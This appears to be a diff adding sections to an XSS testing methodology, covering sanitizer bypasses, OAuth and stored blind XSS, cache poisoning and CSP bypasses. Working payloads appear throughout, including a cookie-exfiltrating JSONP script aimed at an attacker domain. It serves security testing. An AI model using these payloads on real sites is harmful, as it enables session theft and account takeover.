@@ -90,6 +90,19 @@ For GET-based reflection, the URL is the deliverable. Confirm by viewing source,
 
 Look for `#` (fragment) parameters and JS that reads `document.URL`, `location.hash`, `location.search`, `document.referrer`, `window.name`, `localStorage`, `sessionStorage`, `postMessage` data.
 
+**postMessage origin validation bypass:** When a `message` event listener validates origin with `indexOf` (e.g., `e.origin.indexOf("https://target.com") !== -1`), it's bypassable because `"https://target.com".indexOf("https://target.com")` is also truthy for `"https://target.com.attacker.com"`. Register a subdomain like `target.com.attacker.com` and send a postMessage from it to bypass the check.
+
+```javascript
+// Vulnerable pattern
+window.addEventListener("message", function(e) {
+  if (e.origin.indexOf("https://legitimate.com") > -1) {
+    eval(e.data.exec);  // executed from attacker.com/legitimate.com.attacker.com
+  }
+});
+```
+
+Also check for: `startsWith` (bypassed with path traversal: `https://target.com/../`), `===` (correct but look for case mismatch), missing origin check entirely. If `eval`, `innerHTML`, or `document.write` is the sink, postMessage origin bypass is critical severity.
+
 `<script>` may be blocked when injected via `innerHTML` (HTML5 spec — script tags inserted via innerHTML do not execute), so DOM XSS detection prefers event handlers:
 
 ```
@@ -306,6 +319,20 @@ Brief inline catalogue. Full set in `payloads.md`.
 
 ### 8.5 Encoding tricks for blocked strings
 
+**Unicode normalization bypass:** Some sanitizers run before Unicode normalization. Fullwidth or look-alike Unicode characters that normalize to `<`, `>`, `"`, `'`, or `/` bypass sanitization and are then normalized to their ASCII equivalents by the server or browser:
+
+| Unicode | Normalizes to | Use |
+|---|---|---|
+| `＜` U+FF1C | `<` | Opening tag |
+| `＞` U+FF1E | `>` | Closing tag |
+| `＂` U+FF02 | `"` | Attribute quote |
+| `＇` U+FF07 | `'` | Attribute quote |
+| `／` U+FF0F | `/` | Self-closing slash |
+
+Example payload: `＜script/src=//attacker.com＞` — if the app runs NFKC/NFKD normalization after sanitization, this becomes `<script/src=//attacker.com>`.
+
+Also test: combining character sequences (zero-width joiners before `<`), right-to-left override (U+202E) to visually disguise payloads, and homograph attacks in link text.
+
 For the string `alert(1)`:
 - Unicode: `"alert(1)"`
 - Octal: `"\141\154\145\162\164\50\61\51"`
@@ -349,6 +376,115 @@ Common: `<svg onload=alert\`1\`>` (template literal as call)
 ### 8.9 Browser-specific quirks
 
 `html5sec.org` for browser-specific edge cases (mostly IE/old Edge but a few modern Chromium/Firefox idioms remain).
+
+### 8.10 File upload filename injection via RFC 5987 Content-Disposition
+
+When a file upload endpoint sanitizes filenames through CarrierWave or similar server-side libraries, the standard `filename=` parameter gets sanitized. Use the RFC 5987 `filename*=` parameter to bypass:
+
+```
+Content-Disposition: form-data; name="file"; filename*=ASCII-8BIT''your"injected"filename.png
+```
+
+This skips workhorse/CarrierWave sanitization and preserves special characters (quotes, brackets, angle brackets) in the stored filename. If the filename is later rendered into a markdown link, HTML attribute, or any template without escaping, it becomes an injection point.
+
+Whitespace and forward slashes are still stripped by most parsers — inject attributes rather than full tags: `file"class="gfm"a='.png` breaks the href attribute in generated anchor tags.
+
+### 8.11 Reflected XSS in OAuth error page via redirect_to/state parameter
+
+OAuth authorization error pages (bad client_id, unsupported scope, account not allowed) often render the `redirect_to`, `state`, `next`, or `error` query parameter into the HTML response — either directly in a meta-refresh, a link `href`, or as a JS variable — without encoding. The parameter is present in the original authorization request URL and reflects into the error page when auth fails:
+
+```
+GET /oauth/authorize?client_id=INVALID&redirect_to="><script>alert(origin)</script>&response_type=code
+```
+
+**What to look for:**
+- Trigger an OAuth error deliberately (invalid `client_id`, unsupported `scope`, wrong `response_type`)
+- Check if any query param value appears unencoded in the error page HTML
+- Common vulnerable params: `redirect_to`, `redirect_uri`, `next`, `return_to`, `state`, `error_description`
+- Both GET-based (link delivery) and mobile deep-link delivery (click → OAuth error → XSS)
+
+### 8.12 Stored XSS via settings fields rendered in HTML setup/info pages
+
+Fields that appear to be purely technical identifiers — git default branch name, repository name, tag format, commit message template — may be rendered into HTML project setup or information pages without sanitization. The field passes server-side validation (it's "just a branch name") but executes as HTML when a user views the project's empty-state or setup instructions:
+
+```
+# Set default branch name to:
+main<script src="https://YOUR_EZXSS_DOMAIN/branch_name"></script>
+```
+
+**Where it renders:** Empty project setup pages ("use these commands to initialize the repository"), CI/CD pipeline info pages, project overview badges, anywhere the branch/repo name is embedded in instructional HTML.
+
+**Who is affected:** Developers and admins who open the project after the malicious branch name is set — often high-privilege targets with personal access tokens.
+
+**Delivery:** The attacker (with at least group-level ownership) sets the group's default branch name. Any project created in the group inherits it. The XSS fires when a targeted developer views the new project's empty setup page.
+
+### 8.13 Client-supplied ID/UUID fields as stored XSS vectors
+
+When a server allows clients to supply their own object identifiers (UUIDs, reference numbers, record IDs) instead of generating them server-side, the ID value may be stored and later rendered into admin panels, dashboards, or support interfaces without HTML sanitization. ID fields are often assumed to be safe (alphanumeric, structured) and skipped in sanitization logic.
+
+**Detection:** During object creation (account registration, order placement, ticket submission), look for an `id`, `uuid`, `reference_id`, or similar field in the POST body. Try submitting your own value and check if it's accepted.
+
+```
+POST /api/register
+{"email": "test@test.com", "uuid": "<script src=//YOUR_EZXSS_DOMAIN/uuid></script>"}
+```
+
+If the app accepts the custom UUID, inject a blind XSS payload. The ID will appear anywhere the object is displayed — often in admin/support views where it's rendered verbatim.
+
+**Key check:** Even if the server enforces a length limit on the ID, short payloads can still work: `"><img src=x onerror=eval(atob('BASE64_PAYLOAD'))>` or use a URL shortener for script src.
+
+**Impact:** Blind stored XSS executing in admin context — typically higher privilege than the attacker's account.
+
+### 8.14 Web cache poisoning via unkeyed header → stored DOMXSS
+
+When a server reflects an unkeyed request header (most commonly `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Scheme`) into a DOM attribute or inline JS variable, and the response is cacheable, an attacker can poison the cache to serve a DOMXSS payload to all subsequent visitors — effectively converting a reflected DOM injection into a stored XSS affecting every user.
+
+**Detection:**
+```bash
+# Check if X-Forwarded-Host is reflected in the response body or DOM attributes
+curl -s https://target.com/ -H "X-Forwarded-Host: evil.com" | grep -i "evil.com"
+
+# Look for reflection in: data-* attributes, src/href attributes, inline <script> variables
+# e.g.: <body data-site-root="https://evil.com"> or var baseUrl = "https://evil.com";
+```
+
+**Exploiting DOMXSS via poisoned header:**
+1. Confirm `X-Forwarded-Host` is reflected into a DOM attribute or JS variable that downstream JS uses to fetch content
+2. Set up an attacker server at `evil.com` serving a JSON/JS payload that the page's JS will write to the DOM without escaping
+3. Send the poisoned request — confirm the response is cached (`X-Cache: HIT` on second request)
+4. All visitors who hit the cached response will execute the attacker's JS
+
+**Check cacheability:**
+```bash
+# Send twice — same response + X-Cache: HIT on second = cached
+curl -sI https://target.com/ -H "X-Forwarded-Host: evil.com"
+curl -sI https://target.com/ -H "X-Forwarded-Host: evil.com"
+```
+
+**Other unkeyed headers to test:** `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`, `X-HTTP-Method-Override`.
+
+### 8.15 CSS `url()` with hex-escaped characters to smuggle HTML past sanitizers
+
+Some HTML sanitizers parse content as HTML first and then block dangerous tags/attributes, but allow CSS `url()` values through as "safe" strings. CSS allows arbitrary hex escapes inside `url()` values — `url(\3C script\3E)` decodes to `url(<script>)`. If the sanitizer passes the CSS value through without re-parsing its decoded form, and the browser later renders it as HTML in a context where CSS is interpolated into HTML (e.g., an email client's HTML renderer, a rich text preview, or a PDF generator), the escaped characters resolve and the HTML executes.
+
+**Mechanism:** CSS hex escapes follow the form `\HH` or `\HHHHHH` (1–6 hex digits optionally followed by a space). The sequence `\3C` = `<`, `\3E` = `>`, `\22` = `"`, `\27` = `'`.
+
+**Payload shape (inside a CSS property value or `style` attribute):**
+```
+url(\3C script src=//attacker.com\3E\3C/script\3E)
+```
+or via `cid:` URI scheme (used in email multipart/related):
+```css
+background: url(cid:\3C img src=x onerror=alert(1)\3E)
+```
+
+**Where to test:**
+- HTML email composers that allow inline CSS/style attributes
+- Rich text editors that sanitize HTML but pass CSS `url()` through
+- PDF generators (wkhtmltopdf, WeasyPrint) that render user-controlled HTML — CSS hex escapes resolve during rendering
+- Any preview feature that applies an HTML sanitizer and then renders the output in a browser or rendering engine
+
+**Detection:** Submit a payload using `\3C \3E` escapes in a CSS `url()` value. If the sanitizer strips `<script>` but the `url(\3C script\3E)` form passes, check the rendered output for the decoded form.
 
 ---
 
@@ -415,10 +551,23 @@ See `csp-bypass.md` for the full methodology. Quick check:
 3. Check for common weaknesses:
    - `'unsafe-inline'` → inline scripts work; basic payloads fly
    - `'unsafe-eval'` → eval-based payloads work
-   - Allowlisted JSONP-capable hosts (Google domains, common CDNs) → use JSONBee endpoints
+   - Allowlisted JSONP-capable hosts (Google domains, common CDNs) → use JSONBee endpoints. Concrete bypass when `googleapis.com` is allowlisted (extremely common):
+     ```
+     <script src="https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout"></script>
+     ```
+     The `callback=setTimeout` wraps the payload in `setTimeout(...)` for execution. The `//` comments out trailing JSON. Weaponised exfil variant:
+     ```
+     <script src="https://apis.google.com/complete/search?client=chrome&q=fetch('https://YOUR_EZXSS_DOMAIN/?c='+btoa(document.cookie));//&callback=setTimeout"></script>
+     ```
+    
    - `'self'` plus a file-upload functionality → upload `.js` and load it as same-origin
    - Wildcard subdomains of a common CDN → host attack JS there if you can
    - Missing `object-src` → `<object data=...>` may bypass
+   - Missing or permissive `frame-src` / `default-src` → `<iframe srcdoc>` loads an inline HTML document in a sandboxed context that inherits the CSP origin but can load scripts from any source allowed by `script-src`:
+     ```
+     <iframe/srcdoc='<script/src=https://ALLOWED_ORIGIN/path/to/script.js></script>'>
+     ```
+     If you can make a same-origin artifact accessible (uploaded file, artifact URL) its content executes inside the srcdoc iframe under the page's own origin. The `/` after `iframe` avoids space filtering.
 4. Run the CSP through `csp-evaluator.withgoogle.com` for a second opinion
 
 ---
